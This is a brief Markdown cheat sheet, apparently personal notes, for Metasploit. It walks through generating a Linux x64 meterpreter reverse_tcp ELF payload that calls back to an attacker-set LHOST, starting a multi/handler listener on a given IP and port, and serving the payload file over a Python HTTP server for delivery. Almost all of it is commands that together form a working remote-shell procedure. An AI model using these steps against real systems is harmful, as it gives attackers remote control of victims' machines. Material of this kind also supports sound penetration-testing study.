```msfconsole```

## For linux reverse connection 
```use payload/linux/x64/meterpreter/reverse_tcp```
## Set 
```
set LHOST Attackers_IP
set LPORT any_port_no eg:- 6969

generate -f elf -o /home/kali/msf/a.elf
back
use multi/handler

set LHOST 192.168.74.129
set LPORT 9797
set payload linux/x64/meterpreter/reverse_tcp
exploit
```

### Now go to that location where the .elf file is present and 

python3 -m http.server --bind your_ip port_no

